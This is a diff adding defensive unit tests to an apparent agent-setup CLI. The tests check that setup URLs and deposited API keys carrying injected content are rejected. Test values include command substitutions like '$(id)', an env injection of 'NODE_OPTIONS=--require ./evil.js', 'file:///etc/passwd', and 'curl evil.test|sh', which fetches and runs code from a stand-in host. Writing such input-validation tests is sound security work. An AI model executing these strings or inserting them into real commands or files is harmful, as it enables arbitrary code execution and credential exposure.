@@ -26,6 +26,7 @@ import {
   diffEvents,
   detectAgentKind,
   isDirectInvocation,
+  parseSetupUrl,
   upsertEnvLine,
   waitForStart,
   writeEnvSecret,
@@ -307,6 +308,86 @@ describe("upsertEnvLine", () => {
     ).toBe("A=1\nOPENAI_API_KEY=sk-2\nB=2\n");
     expect(upsertEnvLine("A=1\n", "B", "2")).toBe("A=1\nB=2\n");
   });
+
+  it.each([
+    "sk-1\nNODE_OPTIONS=--require ./evil.js",
+    "sk-1\rNODE_OPTIONS=x",
+    "sk-1\u0000",
+    "sk-1\u2028NODE_OPTIONS=x",
+  ])("refuses a value that would add lines: %j", (value) => {
+    expect(() => upsertEnvLine("A=1\n", "OPENAI_API_KEY", value)).toThrow(
+      "must be a single line",
+    );
+  });
+
+  it("keeps an = inside the value on the key's own line", () => {
+    expect(upsertEnvLine("", "KEY", "abc==")).toBe("KEY=abc==\n");
+  });
+});
+
+describe("parseSetupUrl", () => {
+  it.each([
+    ["https://checkout.test/session", "https://checkout.test/session"],
+    ["https://checkout.test/session/", "https://checkout.test/session"],
+    ["https://checkout.test", "https://checkout.test"],
+    ["HTTPS://Checkout.Test:8443/a/b", "https://checkout.test:8443/a/b"],
+    ["http://localhost:18892/checkout/s", "http://localhost:18892/checkout/s"],
+    ["http://127.0.0.1:8787/checkout/s", "http://127.0.0.1:8787/checkout/s"],
+    ["http://[::1]:8787/checkout/s", "http://[::1]:8787/checkout/s"],
+    ["http://app.localhost/checkout/s", "http://app.localhost/checkout/s"],
+  ])("accepts %j", (value, href) => {
+    expect(parseSetupUrl(value)).toBe(href);
+  });
+
+  it.each([
+    ["not a url", "is not a URL"],
+    ["http://checkout.test/session", "must use https"],
+    ["http://localhost.evil.test/session", "must use https"],
+    ["ftp://checkout.test/session", "must use https"],
+    ["file:///etc/passwd", "must use https"],
+    ["javascript:alert(1)", "must use https"],
+    ["https://user:pass@checkout.test/session", "must not carry credentials"],
+    [
+      "https://checkout.test/session?x=$(touch /tmp/pwned)",
+      "query or fragment",
+    ],
+    ["https://checkout.test/session?", "query or fragment"],
+    ["https://checkout.test/session#`id`", "query or fragment"],
+    ["https://checkout.test/s;curl evil.test|sh", "characters"],
+    ["https://checkout.test/s$(id)", "characters"],
+    ["https://checkout.test/s'&&id&&'", "characters"],
+    ["https://checkout.test/s!x*y", "characters"],
+  ])("refuses %j", (value, message) => {
+    expect(() => parseSetupUrl(value)).toThrow(message);
+  });
+
+  it("keeps characters the parser escapes from reaching a shell", () => {
+    const href = parseSetupUrl('https://checkout.test/s`id`"x" y<z>{w}');
+    expect(href).toBe(
+      "https://checkout.test/s%60id%60%22x%22%20y%3Cz%3E%7Bw%7D",
+    );
+  });
+
+  it("refuses an unsafe URL before connecting", async () => {
+    const exit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("exit");
+    });
+    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
+    onTestFinished(() => {
+      exit.mockRestore();
+      stderr.mockRestore();
+      connectCheckoutMock.mockReset();
+    });
+    for (const url of [
+      "https://checkout.test/s;touch${IFS}/tmp/pwned",
+      "https://checkout.test/s?x=`id`",
+      "http://checkout.test/session",
+    ]) {
+      await expect(main([url, "status"])).rejects.toThrow("exit");
+    }
+    expect(connectCheckoutMock).not.toHaveBeenCalled();
+    expect(stderr).toHaveBeenCalledTimes(3);
+  });
 });
 
 describe("detectAgentKind", () => {
@@ -520,6 +601,19 @@ describe("begin planning", () => {
 });
 
 describe("agent instructions", () => {
+  it("prints a setup URL as one quoted shell word", () => {
+    const instructions = agentInstructions("https://checkout.test/a'b;c");
+    expect(instructions).toContain(
+      "npx setup-agent 'https://checkout.test/a'\\''b;c' stream",
+    );
+    expect(instructions).not.toContain(
+      "npx setup-agent https://checkout.test/a'",
+    );
+    expect(agentInstructions("https://checkout.test/s")).toContain(
+      "npx setup-agent https://checkout.test/s stream",
+    );
+  });
+
   it("discovers related products and asks contextual entry points before the plan", () => {
     const instructions = agentInstructions(
       "http://localhost:18892/checkout/session",
@@ -983,6 +1077,81 @@ describe("model key handoff", () => {
       expect.stringContaining('redeem key rejected for "q1"'),
     );
     expect(await readFile(keyFile, "utf8")).toBe(redeemKey);
+  });
+
+  it.each([
+    "sk-1\nNODE_OPTIONS=--require ./evil.js",
+    "sk-1\r\nNODE_OPTIONS=x",
+    "sk 1",
+    'sk-"1"',
+    "sk-$(id)",
+  ])(
+    "refuses a deposited key that is not one API key word: %j",
+    async (key) => {
+      const { state } = await setup();
+      answerModel(state);
+      vi.stubGlobal(
+        "fetch",
+        vi.fn(async () => new Response(key)),
+      );
+      const exit = vi.spyOn(process, "exit").mockImplementation(() => {
+        throw new Error("exit");
+      });
+      const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
+      onTestFinished(() => {
+        exit.mockRestore();
+        stderr.mockRestore();
+      });
+      const directory = await mkdtemp(join(tmpdir(), "setup-agent-env-"));
+      onTestFinished(() => rm(directory, { recursive: true, force: true }));
+      const file = join(directory, ".env.local");
+      await writeFile(file, "A=1\n");
+      await expect(
+        main([
+          "https://checkout.test/session",
+          "env",
+          "q1",
+          "OPENAI_API_KEY",
+          "--file",
+          file,
+        ]),
+      ).rejects.toThrow("exit");
+      expect(stderr).toHaveBeenCalledWith(
+        expect.stringContaining("the deposited key is not a valid API key"),
+      );
+      expect(await readFile(file, "utf8")).toBe("A=1\n");
+    },
+  );
+
+  it("never fetches the key over plain http off this machine", async () => {
+    await setup();
+    const fetch = vi.fn();
+    vi.stubGlobal("fetch", fetch);
+    const exit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("exit");
+    });
+    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
+    onTestFinished(() => {
+      exit.mockRestore();
+      stderr.mockRestore();
+    });
+    connectCheckoutMock.mockClear();
+    await expect(
+      main(["http://checkout.test/session", "env", "q1", "OPENAI_API_KEY"]),
+    ).rejects.toThrow("exit");
+    expect(stderr).toHaveBeenCalledWith(
+      expect.stringContaining("must use https"),
+    );
+    expect(connectCheckoutMock).not.toHaveBeenCalled();
+    expect(fetch).not.toHaveBeenCalled();
+  });
+
+  it("fetches the key over http on localhost", async () => {
+    const { state } = await setup();
+    const fetch = await redeem(state, "http://localhost:18892/checkout/s");
+    expect(fetch.mock.calls[0]?.[0]).toBe(
+      "http://localhost:18892/checkout/s/secret/q1?setup=setup-a",
+    );
   });
 
   it.skipIf(process.platform === "win32")(
